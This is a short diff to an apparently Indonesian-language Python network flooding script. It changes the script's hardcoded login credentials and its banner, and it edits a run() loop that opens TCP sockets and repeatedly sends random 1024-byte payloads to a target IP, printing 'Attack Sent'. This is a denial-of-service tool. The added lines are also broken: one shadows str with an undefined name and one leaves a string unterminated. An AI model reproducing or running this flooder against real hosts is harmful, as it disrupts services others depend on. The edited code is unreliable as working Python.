@@ -48,8 +48,8 @@ while attemps < 100:
     username = input('Enter your username: ')
     password = input('Enter your password: ')
 
-    if username == 'n0lk0ma' and password == 'n0lk0ma':
-        print('Selamat datang di zona BLACKP∆NTHER!!')
+    if username == 'r2' and password == 'r2':
+        print("GUNAKAN SCRIPT INI DENGAN BIJAK...!!")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -79,6 +79,7 @@ time.sleep(5),
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]","[-]"))
+	str = u
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -86,7 +87,7 @@ def run():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(" [💥]  \033[32m" +str(u)+ " \033[31mZ0NA R2 \033[34mAttack Sent to \033[94m" +ip+ ")
 		except:
 			s.close()
 			print("[*] Error!!!")
